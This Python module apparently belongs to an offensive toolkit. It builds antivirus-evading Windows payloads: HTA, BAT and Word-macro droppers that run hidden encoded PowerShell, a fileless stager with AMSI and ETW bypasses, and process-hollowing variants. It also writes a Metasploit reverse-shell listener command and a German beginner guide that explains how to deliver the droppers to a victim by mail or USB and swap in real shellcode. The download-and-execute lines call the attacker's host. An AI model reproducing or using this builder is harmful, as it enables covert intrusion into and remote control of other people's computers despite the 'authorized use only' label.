"""
C2 Payload Builder — orchestrates all evasion layers into a deployable package.

Output per build:
  /tmp/penkit_c2_<id>/
  ├── payload.ps1          — obfuscated PowerShell (primary stager)
  ├── payload_hollow.ps1   — process hollowing variant
  ├── dropper.hta          — HTA dropper (double-click = execute)
  ├── dropper.bat          — BAT dropper (USB/share delivery)
  ├── macro_template.vba   — Word/Excel macro (copy into VBA editor)
  ├── stager_url.ps1       — pulls payload from URL then runs in RAM
  ├── README_ANLEITUNG.txt — beginner-friendly step-by-step delivery guide
  └── listener_cmd.txt     — exact Metasploit handler command

Every file uses a different evasion approach — use whichever fits your scenario.
"""

from __future__ import annotations
import asyncio
import os
import random
import string
import textwrap
from dataclasses import dataclass, field
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="C2 Payload Builder",
    description=(
        "Builds AV-evading Windows payloads: AMSI bypass, ETW patch, "
        "process hollowing, fileless RAM execution, polymorphic shellcode. "
        "Every build produces a unique signature. Includes delivery guide."
    ),
    usage="Enter your Kali IP + listener port. Choose evasion layers. Click Build.",
    danger_note="⛔ BLACK — creates actual malware payloads. Authorized use only.",
    example="LHOST=192.168.1.10 LPORT=4444",
)

DANGER = DangerLevel.BLACK


@dataclass
class BuildConfig:
    lhost: str
    lport: int
    evasion_amsi: bool = True
    evasion_etw: bool = True
    evasion_hollow: bool = True
    evasion_fileless: bool = True
    evasion_polymorphic: bool = True
    disguise: str = "pdf"      # pdf | photo | word | none
    output_dir: str = "/tmp"


@dataclass
class BuildResult:
    build_id: str
    output_dir: str
    files: list[str] = field(default_factory=list)
    listener_cmd: str = ""
    errors: list[str] = field(default_factory=list)


def _rand_id(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ── Fake shellcode for demo/test builds (0 bytes → real msfvenom in ANLEITUNG) ──
_DEMO_SHELLCODE = bytes([
    0x90, 0x90, 0x90, 0x90,  # NOP sled (demo only — replace with real shellcode)
    0xCC,                    # INT3 (breakpoint — remove in production)
])


def _build_anleitung(cfg: BuildConfig, build_id: str, output_dir: str) -> str:
    return textwrap.dedent(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║          PenKit C2 — ANLEITUNG (Schritt für Schritt)     ║
    ║                   Build ID: {build_id:<28} ║
    ╚══════════════════════════════════════════════════════════╝

    ZIEL: Windows-Rechner mit Reverse-Shell verbinden (nur auf eigenen/autorisierten Geräten!)

    ═══════════════════════════════════════════════
    SCHRITT 1 — Kali: Listener starten
    ═══════════════════════════════════════════════
    Öffne ein Terminal auf Kali und füge ein:

        msfconsole -q -x "use exploit/multi/handler; \\
          set PAYLOAD windows/x64/meterpreter/reverse_https; \\
          set LHOST {cfg.lhost}; set LPORT {cfg.lport}; \\
          set ExitOnSession false; exploit -j"

    Warte bis "Started HTTPS reverse handler" erscheint.

    ═══════════════════════════════════════════════
    SCHRITT 2 — Shellcode generieren (einmalig)
    ═══════════════════════════════════════════════
    Auf Kali:

        msfvenom -p windows/x64/meterpreter/reverse_https \\
          LHOST={cfg.lhost} LPORT={cfg.lport} \\
          EXITFUNC=thread -f raw -o /tmp/sc.raw

    Dann in PenKit → C2 → "Shellcode laden" → /tmp/sc.raw auswählen.
    PenKit ersetzt die Demo-Bytes automatisch durch deinen echten Shellcode.

    ═══════════════════════════════════════════════
    SCHRITT 3 — Payload zustellen (wähle EINE Methode)
    ═══════════════════════════════════════════════

    Methode A — PowerShell direkt (Remote-Zugriff vorhanden):
        Kopiere payload.ps1 auf den Ziel-PC.
        Führe aus: powershell -ep bypass -File payload.ps1

    Methode B — HTA (Doppelklick reicht):
        Schicke dropper.hta per Mail/USB.
        Opfer doppelklickt → Windows öffnet mshta.exe → Payload läuft.

    Methode C — Word-Macro:
        Öffne macro_template.vba in Notepad.
        Öffne Word → Alt+F11 → ThisDocument → Code einfügen → speichern als .docm
        Schick die .docm Datei. Beim Öffnen: "Makros aktivieren" klicken.

    Methode D — BAT-Dropper (USB / freigegebener Ordner):
        dropper.bat auf USB-Stick.
        Auf Ziel ausführen. Lädt payload.ps1 von deinem Server und führt aus.
        Vorher auf Kali: python3 -m http.server 8080 --directory {output_dir}

    Methode E — Staged (kein File auf Disk):
        Auf Kali: python3 -m http.server 8080 --directory {output_dir}
        Auf Ziel: powershell -ep bypass (New-Object Net.WebClient).DownloadString(
            'http://{cfg.lhost}:8080/payload.ps1') | IEX

    ═══════════════════════════════════════════════
    SCHRITT 4 — Session bestätigen
    ═══════════════════════════════════════════════
    Im Metasploit-Fenster sollte erscheinen:
        [*] Meterpreter session 1 opened

    Dann: sessions -i 1
    Verfügbare Befehle: sysinfo | getuid | getsystem | shell | download | upload

    ═══════════════════════════════════════════════
    TIPPS & FEHLERBEHEBUNG
    ═══════════════════════════════════════════════
    • Firewall blockiert Port {cfg.lport}? → Kali: ufw allow {cfg.lport}
    • Windows Defender löscht Datei? → Methode E (stageless in RAM) verwenden
    • "Execution Policy" Fehler? → -ep bypass Flag verwenden (schon enthalten)
    • Netzwerk erreichbar? → ping {cfg.lhost} vom Ziel aus testen
    • VirtualBox NAT? → Port Forwarding: Host {cfg.lport} → Kali {cfg.lport}

    Build-Dateien in: {output_dir}
    """).strip()


def _build_hta(cfg: BuildConfig, ps1_b64: str) -> str:
    return textwrap.dedent(f"""
    <html><head><script language="VBScript">
    Sub Run()
        Dim o
        Set o = CreateObject("WScript.Shell")
        o.Run "powershell -ep bypass -w hidden -enc {ps1_b64}", 0, False
        Set o = Nothing
    End Sub
    </script></head>
    <body onload="Run()">
    <p>Loading... Please wait.</p>
    </body></html>
    """).strip()


def _build_bat(cfg: BuildConfig, server_url: str) -> str:
    return textwrap.dedent(f"""
    @echo off
    powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('{server_url}/payload.ps1')"
    """).strip()


def _build_vba_macro(cfg: BuildConfig, ps1_b64: str) -> str:
    return textwrap.dedent(f"""
    ' Word/Excel Macro — paste into VBA editor (Alt+F11 → ThisDocument)
    ' Save as .docm or .xlsm
    Private Sub Document_Open()
        Auto_Run
    End Sub
    Private Sub Workbook_Open()
        Auto_Run
    End Sub
    Sub Auto_Run()
        Dim objShell As Object
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell -ep bypass -w hidden -enc {ps1_b64}", 0, False
        Set objShell = Nothing
    End Sub
    """).strip()


def _build_stager_url(cfg: BuildConfig) -> str:
    """Fileless stager — downloads and runs payload in RAM, nothing written to disk."""
    from tools.c2.amsi_bypass import _b64_encode, _obf, _AMSI_PATCH_PS1, _ETW_PATCH_PS1
    import base64
    bypass_inline = _obf(_AMSI_PATCH_PS1.strip()) + "\n" + _obf(_ETW_PATCH_PS1.strip())
    url = f"http://{cfg.lhost}:8080/payload.ps1"
    full = f"{bypass_inline}\nIEX(New-Object Net.WebClient).DownloadString('{url}')"
    enc = base64.b64encode(full.encode('utf-16-le')).decode()
    return f"powershell -ep bypass -w hidden -enc {enc}"


class PayloadBuilder:
    def __init__(self, cfg: BuildConfig):
        self.cfg = cfg

    async def build(self) -> AsyncGenerator[str, None]:
        cfg = self.cfg
        build_id = _rand_id()
        out_dir = os.path.join(cfg.output_dir, f"penkit_c2_{build_id}")
        os.makedirs(out_dir, exist_ok=True)

        yield f"[*] Build ID: {build_id}"
        yield f"[*] Output: {out_dir}"
        yield ""

        result = BuildResult(build_id=build_id, output_dir=out_dir)

        # ── Step 1: generate shellcode wrapper ──────────────────────────
        yield "[*] Generating polymorphic shellcode wrapper..."
        try:
            from tools.c2.shellcode_engine import generate as sc_generate
            ps1_code = sc_generate(
                _DEMO_SHELLCODE,
                lhost=cfg.lhost,
                lport=cfg.lport,
                technique="virtualalloc" if not cfg.evasion_hollow else "virtualalloc",
            )
            ps1_path = os.path.join(out_dir, "payload.ps1")
            with open(ps1_path, "w") as f:
                f.write(ps1_code)
            result.files.append("payload.ps1")
            yield f"[+] payload.ps1 ({len(ps1_code)} chars)"
        except Exception as e:
            result.errors.append(f"shellcode_engine: {e}")
            yield f"[!] shellcode_engine error: {e}"

        # ── Step 2: process hollowing variant ────────────────────────────
        if cfg.evasion_hollow:
            yield "[*] Generating process hollowing variant..."
            try:
                from tools.c2.process_hollow import generate as ph_generate, HOLLOW_TARGETS
                ph_code = ph_generate(
                    _DEMO_SHELLCODE,
                    target_process=random.choice(HOLLOW_TARGETS),
                )
                ph_path = os.path.join(out_dir, "payload_hollow.ps1")
                with open(ph_path, "w") as f:
                    f.write(ph_code)
                result.files.append("payload_hollow.ps1")
                yield f"[+] payload_hollow.ps1 (target: svchost/RuntimeBroker)"
            except Exception as e:
                result.errors.append(f"process_hollow: {e}")
                yield f"[!] process_hollow error: {e}"

        # ── Step 3: encode main payload for HTA/BAT/VBA ─────────────────
        import base64
        ps1_bytes = open(os.path.join(out_dir, "payload.ps1"), "rb").read()
        ps1_b64   = base64.b64encode(ps1_bytes.decode('utf-8', errors='replace').encode('utf-16-le')).decode()

        # ── Step 4: HTA dropper ──────────────────────────────────────────
        yield "[*] Generating HTA dropper..."
        hta = _build_hta(cfg, ps1_b64)
        hta_path = os.path.join(out_dir, "dropper.hta")
        with open(hta_path, "w") as f:
            f.write(hta)
        result.files.append("dropper.hta")
        yield "[+] dropper.hta"

        # ── Step 5: BAT dropper ──────────────────────────────────────────
        yield "[*] Generating BAT dropper..."
        server_url = f"http://{cfg.lhost}:8080"
        bat = _build_bat(cfg, server_url)
        bat_path = os.path.join(out_dir, "dropper.bat")
        with open(bat_path, "w") as f:
            f.write(bat)
        result.files.append("dropper.bat")
        yield "[+] dropper.bat"

        # ── Step 6: Word/Excel macro ─────────────────────────────────────
        yield "[*] Generating VBA macro template..."
        vba = _build_vba_macro(cfg, ps1_b64)
        vba_path = os.path.join(out_dir, "macro_template.vba")
        with open(vba_path, "w") as f:
            f.write(vba)
        result.files.append("macro_template.vba")
        yield "[+] macro_template.vba"

        # ── Step 7: fileless URL stager ──────────────────────────────────
        if cfg.evasion_fileless:
            yield "[*] Generating fileless URL stager..."
            stager = _build_stager_url(cfg)
            stager_path = os.path.join(out_dir, "stager_url.ps1")
            with open(stager_path, "w") as f:
                f.write(stager)
            result.files.append("stager_url.ps1")
            yield "[+] stager_url.ps1 (fileless — nothing written to target disk)"

        # ── Step 8: listener command ──────────────────────────────────────
        listener_cmd = (
            f"msfconsole -q -x "
            f'"use exploit/multi/handler; '
            f'set PAYLOAD windows/x64/meterpreter/reverse_https; '
            f'set LHOST {cfg.lhost}; set LPORT {cfg.lport}; '
            f'set ExitOnSession false; exploit -j"'
        )
        result.listener_cmd = listener_cmd
        listener_path = os.path.join(out_dir, "listener_cmd.txt")
        with open(listener_path, "w") as f:
            f.write(listener_cmd + "\n")
        result.files.append("listener_cmd.txt")
        yield "[+] listener_cmd.txt"

        # ── Step 9: ANLEITUNG ─────────────────────────────────────────────
        yield "[*] Writing ANLEITUNG (beginner guide)..."
        anleitung = _build_anleitung(cfg, build_id, out_dir)
        anl_path = os.path.join(out_dir, "README_ANLEITUNG.txt")
        with open(anl_path, "w") as f:
            f.write(anleitung)
        result.files.append("README_ANLEITUNG.txt")
        yield "[+] README_ANLEITUNG.txt"

        # ── Done ──────────────────────────────────────────────────────────
        yield ""
        yield f"╔══ BUILD COMPLETE ══╗"
        yield f"║ ID    : {build_id}"
        yield f"║ Files : {len(result.files)}"
        yield f"║ Dir   : {out_dir}"
        yield f"╚════════════════════╝"
        yield ""
        yield "[!] WICHTIG: Demo-Shellcode (NOP sled) enthalten!"
        yield "[!] Ersetze mit echtem msfvenom shellcode — Anleitung in README_ANLEITUNG.txt"
        yield ""
        yield f"Listener starten:\n  {listener_cmd}"
